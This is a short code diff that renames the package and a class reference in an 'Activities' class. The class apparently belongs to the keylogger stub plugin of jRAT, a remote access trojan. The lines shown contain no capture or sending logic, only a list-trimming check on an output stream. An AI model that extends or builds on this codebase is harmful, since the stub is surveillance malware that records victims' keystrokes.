@@ -1,9 +1,9 @@
-package pro.jrat.plugin.stub.activities;
+package pro.jrat.plugin.keylogger.stub.activities;
 
 import java.util.ArrayList;
 import java.util.List;
 
-import pro.jrat.plugin.stub.KeyloggerPlugin;
+import pro.jrat.plugin.keylogger.stub.StubPlugin;
 
 public class Activities {
 
@@ -19,7 +19,7 @@ public class Activities {
 			activities.add(activity);
 		}
 		
-		if (KeyloggerPlugin.dos != null) {
+		if (StubPlugin.dos != null) {
 			if (online.size() > 2500) {
 				online.clear();
 			}
